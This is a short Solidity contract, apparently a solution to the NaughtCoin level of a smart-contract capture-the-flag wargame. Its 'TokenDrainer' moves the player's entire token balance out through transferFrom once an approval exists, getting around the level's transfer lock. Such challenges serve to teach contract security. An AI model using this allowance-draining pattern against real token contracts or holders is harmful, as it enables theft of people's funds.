pragma solidity ^0.8.0;

import "../levels/NaughtCoin.sol";

contract TokenDrainer {
    function drainTokens(NaughtCoin coin) external {
        address player = coin.player();
        uint256 balance = coin.balanceOf(player);
        
        // This will only work if player has approved this contract
        coin.transferFrom(player, address(this), balance);
    }
    
    function checkPlayerBalance(NaughtCoin coin) external view returns (uint256) {
        return coin.balanceOf(coin.player());
    }
}